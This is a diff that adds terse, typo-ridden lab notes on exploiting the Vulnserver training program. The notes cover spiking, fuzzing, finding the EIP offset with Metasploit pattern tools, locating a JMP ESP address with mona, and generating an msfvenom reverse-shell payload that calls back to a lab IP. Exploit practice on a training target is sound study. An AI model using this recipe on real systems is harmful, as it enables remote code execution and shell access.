@@ -1,0 +1,56 @@
+Vuln Server part 2 LTER
+
+
+A. Spiking =>generic_send_tcp 192.168.1.133 9999 spike.spk 0 0
+
+
+B. Fuzzing => buyffer crash at 2100
+
+
+C. Findinf offset=> 
+/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 2100
+
+EIP Pointer-=> 386F4337
+
+D. Finding exject buffer buffer sdpace via offset
+
+/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -l 2100 -q 386F4337
+
+Exject Match=> 2003
+
+
+E. Controloing EIP  { Shellcode="A" * 2003 +"B" * 4 }
+
+F FInding bad chacacter Shellcode="A" * 2003 +"B" * 4 + bad_char
+
+"\x00" + 
+
+G: modules to set find exject ESP address DLL
+   {
+      !mona modules  =>
+      
+ Address=0BADF00D  [essfunc.dll] (C:\Users\vinod\Desktop\Vul UFF\essfunc.dll)
+
+ Address=0BADF00D  [vulnserver.exe] (C:\Users\vinod\Desktop\Vul UFF\vulnserver.exe)
+
+   }
+
+ H Finding JMP ESP modules for  "FFE4"
+
+ !mona find -s "\xff\xe4" -m essfunc.dll
+ return address=> 
+ Address=625011AF
+ Address=625011BB
+ Address=625011C7
+ Address=625011D3
+ Address=625011DF
+ Address=625011EB
+ Address=625011F7
+ Address=62501203
+ Address=62501205
+
+ I G:  Check for EIP contril and vreak point
+ Shellcode="A" * 2003 + "\xaf\x11\x50\x62"
+
+ H: shell code
+ msfvenom -p windows/shell_reverse_tcp LHOS=192.168.1.147 LPORT=1234 EXITFUNC=thread -f c  -b "\x00"
